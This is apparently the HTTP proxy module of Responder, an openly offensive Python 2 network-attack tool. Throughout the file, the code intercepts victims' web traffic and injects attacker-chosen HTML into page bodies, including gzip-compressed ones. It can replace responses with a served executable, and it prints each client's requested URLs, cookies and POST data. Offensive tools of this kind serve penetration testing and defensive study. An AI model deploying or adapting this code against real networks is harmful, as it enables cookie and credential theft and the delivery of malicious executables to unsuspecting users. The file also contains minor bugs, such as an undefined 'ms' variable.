#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import settings
import urlparse
import select
import zlib
import BaseHTTPServer

from utils import *

def HandleGzip(Headers, Content, Payload):
	if len(Content) > 5:
		try:
			unziped = zlib.decompress(Content, 16+zlib.MAX_WBITS)
		except:
			return False

		InjectPayload = Payload
		Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
		HasBody = re.findall('(?<=<body)[^<]*', unziped)

		if HasBody:
			print text("[PROXY] Injecting into HTTP Response: %s" % color(settings.Config.HTMLToServe, 3, 1))

			Content = unziped.replace("<body", settings.Config.HTMLToServe +"\n<body")
			ziped = zlib.compress(Content)
			FinalLen = str(len(ziped))
			Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
			return Headers+'\r\n\r\n'+ziped
	
	return False

def InjectPage(data, client):
	if settings.Config.Exec_Mode_On_Off:
		if settings.Config.Exe_Filename.endswith('.exe'):
			buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,settings.Config.Exe_Filename),ContentDiFile=settings.Config.Exe_Filename)
			buffer1.calculate()
			return str(buffer1)
		else:
			buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,settings.Config.Exe_Filename))
			buffer1.calculate()
			return str(buffer1)
	else:
		return data

def InjectData(data):
	if len(data.split('\r\n\r\n')) > 1:
		try:
			Headers, Content = data.split('\r\n\r\n')
		except:
			return data

		RedirectCodes = ['HTTP/1.1 300', 'HTTP/1.1 301', 'HTTP/1.1 302', 'HTTP/1.1 303', 'HTTP/1.1 304', 'HTTP/1.1 305', 'HTTP/1.1 306', 'HTTP/1.1 307']

		if [s for s in RedirectCodes if s in Headers]:
			return data

		if "content-encoding: gzip" in Headers.lower():

			Gzip = HandleGzip(Headers, Content, settings.Config.HTMLToServe)
			return Gzip if Gzip else data

		if "content-type: text/html" in Headers.lower():

			Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
			HasBody = re.findall('(?<=<body)[^<]*', Content)
			
			if HasBody:
				print text("[PROXY] Injecting into HTTP Response: %s" % color(settings.Config.HTMLToServe, 3, 1))

				NewContent = Content.replace("<body", settings.Config.HTMLToServe +"\n<body")
				Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+ str(len(NewContent)))

				return Headers+'\r\n\r\n'+NewContent

	return data

class ProxySock:
	
	def __init__(self, socket, proxy_host, proxy_port) : 

		# First, use the socket, without any change
		self.socket = socket

		# Create socket (use real one)
		self.proxy_host = proxy_host
		self.proxy_port = proxy_port

		# Copy attributes
		self.family = socket.family
		self.type = socket.type
		self.proto = socket.proto

	def connect(self, address) :

		# Store the real remote adress
		(self.host, self.port) = address
	   
		# Try to connect to the proxy 
		for (family, socktype, proto, canonname, sockaddr) in socket.getaddrinfo(
			self.proxy_host, 
			self.proxy_port,
			0, 0, socket.SOL_TCP) :
			try:
				
				# Replace the socket by a connection to the proxy
				self.socket = socket.socket(family, socktype, proto)
				self.socket.connect(sockaddr)
					
			except socket.error, msg:
				if self.socket:
					self.socket.close()
				self.socket = None
				continue
			break
		if not self.socket :
			raise socket.error, ms 
		
		# Ask him to create a tunnel connection to the target host/port
		self.socket.send(
				("CONNECT %s:%d HTTP/1.1\r\n" + 
				"Host: %s:%d\r\n\r\n") % (self.host, self.port, self.host, self.port));

		# Get the response
		resp = self.socket.recv(4096)

		# Parse the response
		parts = resp.split()
		
		# Not 200 ?
		if parts[1] != "200":
			print color("[!] Error response from upstream proxy: %s" % resp, 1)
			pass

	# Wrap all methods of inner socket, without any change
	def accept(self) :
		return self.socket.accept()

	def bind(self, *args) :
		return self.socket.bind(*args)
	
	def close(self) :
		return self.socket.close()
	
	def fileno(self) :
		return self.socket.fileno()

	def getsockname(self) :
		return self.socket.getsockname()
	
	def getsockopt(self, *args) :
		return self.socket.getsockopt(*args)
	
	def listen(self, *args) :
		return self.socket.listen(*args)
	
	def makefile(self, *args) :
		return self.socket.makefile(*args)
	
	def recv(self, *args) :
		return self.socket.recv(*args)
	
	def recvfrom(self, *args) :
		return self.socket.recvfrom(*args)

	def recvfrom_into(self, *args) :
		return self.socket.recvfrom_into(*args)
	
	def recv_into(self, *args) :
		return self.socket.recv_into(buffer, *args)
	
	def send(self, *args) :
		try:
			return self.socket.send(*args)
		except:
			pass
	
	def sendall(self, *args) :
		return self.socket.sendall(*args)
	
	def sendto(self, *args) :
		return self.socket.sendto(*args)
	
	def setblocking(self, *args) :
		return self.socket.setblocking(*args)
	
	def settimeout(self, *args) :
		return self.socket.settimeout(*args)
	
	def gettimeout(self) :
		return self.socket.gettimeout()
	
	def setsockopt(self, *args):
		return self.socket.setsockopt(*args)
	
	def shutdown(self, *args):
		return self.socket.shutdown(*args)

	# Return the (host, port) of the actual target, not the proxy gateway
	def getpeername(self) :
		return (self.host, self.port)

# Inspired from Tiny HTTP proxy, original work: SUZUKI Hisao.
class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
	__base = BaseHTTPServer.BaseHTTPRequestHandler
	__base_handle = __base.handle

	rbufsize = 0

	def handle(self):
		(ip, port) =  self.client_address
		self.__base_handle()

	def _connect_to(self, netloc, soc):
		i = netloc.find(':')
		if i >= 0:
			host_port = netloc[:i], int(netloc[i+1:])
		else:
			host_port = netloc, 80
		try: soc.connect(host_port)
		except socket.error, arg:
			try: msg = arg[1]
			except: msg = arg
			self.send_error(404, msg)
			return 0
		return 1

	def socket_proxy(self):
		Proxy = settings.Config.Upstream_Proxy
		Proxy = Proxy.rstrip('/').replace('http://', '').replace('https://', '')
		Proxy = Proxy.split(':')

		try:    Proxy = (Proxy[0], int(Proxy[1]))
		except: Proxy = (Proxy[0], 8080)

		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		return ProxySock(soc, Proxy[0], Proxy[1])

	def do_CONNECT(self):

		if settings.Config.Upstream_Proxy:
			soc = self.socket_proxy()
		else:
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			if self._connect_to(self.path, soc):
				self.wfile.write(self.protocol_version +" 200 Connection established\r\n")
				self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
				self.wfile.write("\r\n")
				try:
					self._read_write(soc, 300)
				except:
					pass
		finally:
			soc.close()
			self.connection.close()

	def do_GET(self):
		(scm, netloc, path, params, query, fragment) = urlparse.urlparse(self.path, 'http')

		if scm not in ('http') or fragment or not netloc:
			self.send_error(400, "bad url %s" % self.path)
			return

		if settings.Config.Upstream_Proxy:
			soc = self.socket_proxy()
		else:
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			URL_Unparse = urlparse.urlunparse(('', '', path, params, query, ''))

			if self._connect_to(netloc, soc):
				soc.send("%s %s %s\r\n" % (self.command, URL_Unparse, self.request_version))

				Cookie = self.headers['Cookie'] if "Cookie" in self.headers else ''

				print text("[PROXY] Client        : %s" % color(self.client_address[0], 3, 0))
				print text("[PROXY] Requested URL : %s" % color(self.path, 3, 0))
				print text("[PROXY] Cookie        : %s" % Cookie)

				self.headers['Connection'] = 'close'
				del self.headers['Proxy-Connection']
				
				for key_val in self.headers.items():
					soc.send("%s: %s\r\n" % key_val)
				soc.send("\r\n")

				try: self._read_write(soc, netloc)
				except: pass

		finally:
			soc.close()
			self.connection.close()

	def _read_write(self, soc, netloc='', max_idling=30):
		iw = [self.connection, soc]
		ow = []
		count = 0
		while 1:
			count += 1
			(ins, _, exs) = select.select(iw, ow, iw, 1)
			if exs:
				break
			if ins:
				for i in ins:
					if i is soc:
						out = self.connection
						try:
							data = i.recv(8192)
							if len(settings.Config.HTMLToServe)>5:
								data = InjectData(data)
							else:
								data = InjectPage(data,self.client_address[0])

						except:
							pass
					else:
						out = soc
						data = i.recv(8192)
						if self.command == "POST":
							print text("[PROXY] POST Data     : %s" % data)
					if data:
						try:
							out.send(data)
							count = 0
						except:
							pass
			if count == max_idling:
				break
		return None


	do_HEAD = do_GET
	do_POST = do_GET
	do_PUT  = do_GET
	do_DELETE=do_GET
